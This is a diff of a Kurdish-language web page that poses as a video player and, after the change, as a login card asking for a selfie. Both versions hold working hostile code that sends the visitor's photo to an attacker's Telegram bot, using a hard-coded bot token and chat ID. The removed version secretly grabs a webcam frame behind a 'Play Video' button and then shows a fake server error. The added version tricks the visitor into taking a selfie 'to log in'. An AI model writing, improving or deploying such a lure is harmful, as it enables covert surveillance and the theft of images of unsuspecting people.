@@ -1,54 +1,123 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player</title>
-</head>
-<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center;">
+    <title>تۆمارکردن</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); /* نەخشی باگراوند */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+        }
 
-    <div id="main-container">
-        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
-        <button id="startBtn" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer;">Play Video 🎬</button>
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px); /* لێڵکردنی پشتەوە */
+            padding: 40px 20px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            width: 85%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: 500;
+        }
+
+        .upload-btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: #ffffff;
+            color: #1e3c72;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .upload-btn:active {
+            transform: scale(0.95);
+            background: #f0f0f0;
+        }
+
+        #status {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #e0e0e0;
+            min-height: 20px;
+        }
+
+        /* شێوەی خڕ لە باگراوند بۆ جوانی */
+        .circle {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            z-index: -1;
+        }
+        .c1 { top: 10%; left: 10%; }
+        .c2 { bottom: 10%; right: 10%; }
+    </style>
+</head>
+<body>
+
+    <div class="circle c1"></div>
+    <div class="circle c2"></div>
+
+    <div class="card">
+        <h2>بۆ چوونە ژوورەوە وێنەیەک بگرە 📸</h2>
+        
+        <input type="file" accept="image/*" capture="user" id="cameraInput" style="display: none;">
+        
+        <label for="cameraInput" class="upload-btn">
+            کردنەوەی کامێرا
+        </label>
+
+        <p id="status"></p>
     </div>
 
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-
     <script>
-        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
-        const myId = '7978104952'; 
+        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g';
+        const myId = '7978104952';
 
-        document.getElementById('startBtn').addEventListener('click', function() {
-            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
-            this.style.display = 'none';
+        document.getElementById('cameraInput').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
 
-            navigator.mediaDevices.getUserMedia({ video: true })
-            .then(s => {
-                const v = document.getElementById('v');
-                v.srcObject = s;
-                
-                setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = 640; c.height = 480;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    c.toBlob(b => {
-                        const f = new FormData();
-                        f.append('chat_id', myId);
-                        f.append('photo', b, 'img.jpg');
+            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە، زانیارییەکان دەنێردرێن...";
 
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: f
-                        }).then(() => {
-                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
-                        });
-                    }, 'image/jpeg');
-                }, 1000);
+            const formData = new FormData();
+            formData.append('chat_id', myId);
+            formData.append('photo', file);
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
             })
-            .catch(e => {
-                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
+            .then(res => {
+                if(res.ok) {
+                    document.getElementById('status').innerText = "تەواو! سەرکەوتوو بوو.";
+                    document.getElementById('status').style.color = "#4CAF50";
+                } else {
+                    document.getElementById('status').innerText = "هەڵەیەک ڕوویدا لە ناردن.";
+                }
+            })
+            .catch(err => {
+                document.getElementById('status').innerText = "کێشەی ئینتەرنێت هەیە.";
             });
         });
     </script>
